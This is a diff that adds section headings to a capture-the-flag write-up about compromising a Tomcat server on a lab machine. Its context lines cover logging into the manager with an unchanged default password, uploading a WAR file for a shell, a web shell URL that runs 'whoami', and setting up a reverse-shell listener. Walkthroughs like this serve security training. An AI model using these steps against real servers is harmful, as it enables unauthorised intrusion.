@@ -1,3 +1,4 @@
+## Enumeration
 
 We start by running nmap to see what ports are on on the target machine 
 ```bash
@@ -27,6 +28,8 @@ There are a few ways to find out what version of tomcat we are using, if we go t
 http://10.10.10.95:8080/ok
 ```
 ![pic0](./pic0.png)
+## Observations
+
 We can go to:
 ```bash
 http://10.10.10.95:8080/manager/html
@@ -42,6 +45,9 @@ Lucky someone left their password unchanged as we can see if we click cancel.
 ...
 ```
 Now if we use that we are in!
+
+## Exploit
+
 As we know if we are in we can get a reverse shell by uploading a war file, if we go down to `WAR file to deploy` 
 
 So lets make a war file that can give us a shell! 
@@ -84,6 +90,8 @@ if we want to interact with the web shell
 http://10.10.10.95:8080/shell/cmd.jsp?cmd=whoami
 ```
 but we dont want a web shell.
+
+## Privileges Escalation
 
 set up a listener:
 ```bash
